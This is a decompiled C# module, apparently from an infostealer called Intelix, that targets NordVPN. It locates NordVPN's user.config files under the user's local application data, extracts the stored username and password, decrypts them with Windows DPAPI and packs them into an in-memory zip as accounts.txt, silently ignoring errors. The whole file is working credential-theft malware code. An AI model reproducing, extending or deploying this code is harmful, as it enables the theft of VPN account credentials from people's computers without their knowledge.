using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Vpn
{
	// Token: 0x0200000E RID: 14
	public class NordVpn : ITarget
	{
		// Token: 0x0600002E RID: 46 RVA: 0x00002DDC File Offset: 0x00000FDC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
			bool flag = !directoryInfo.Exists;
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "NordVPN";
				try
				{
					DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
					foreach (DirectoryInfo directoryInfo2 in directories)
					{
						List<string> list = new List<string>();
						DirectoryInfo[] directories2 = directoryInfo2.GetDirectories();
						for (int j = 0; j < directories2.Length; j++)
						{
							string text = Path.Combine(directories2[j].FullName, "user.config");
							bool flag2 = File.Exists(text);
							if (flag2)
							{
								XmlDocument xmlDocument = new XmlDocument();
								xmlDocument.Load(text);
								XmlNode xmlNode = xmlDocument.SelectSingleNode("//setting[@name='Username']/value");
								string text2 = NordVpn.Decode((xmlNode != null) ? xmlNode.InnerText : null);
								XmlNode xmlNode2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value");
								string text3 = NordVpn.Decode((xmlNode2 != null) ? xmlNode2.InnerText : null);
								bool flag3 = !string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3);
								if (flag3)
								{
									list.Add("Username: " + text2 + "\nPassword: " + text3);
								}
							}
						}
						bool flag4 = list.Count > 0;
						if (flag4)
						{
							string entryPath = Path.Combine("NordVPN", directoryInfo2.Name, "accounts.txt");
							counterApplications.Files.Add(directoryInfo2.FullName + " => NordVPN\\");
							counterApplications.Files.Add("NordVPN\\");
							zip.AddTextFile(entryPath, string.Join("\n\n", list));
						}
					}
				}
				catch
				{
				}
				counterApplications.Files.Add("NordVPN\\");
				counter.Vpns.Add(counterApplications);
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002FE8 File Offset: 0x000011E8
		private static string Decode(string s)
		{
			return Encoding.UTF8.GetString(DpApi.Decrypt(Convert.FromBase64String(s))) ?? "";
		}
	}
}
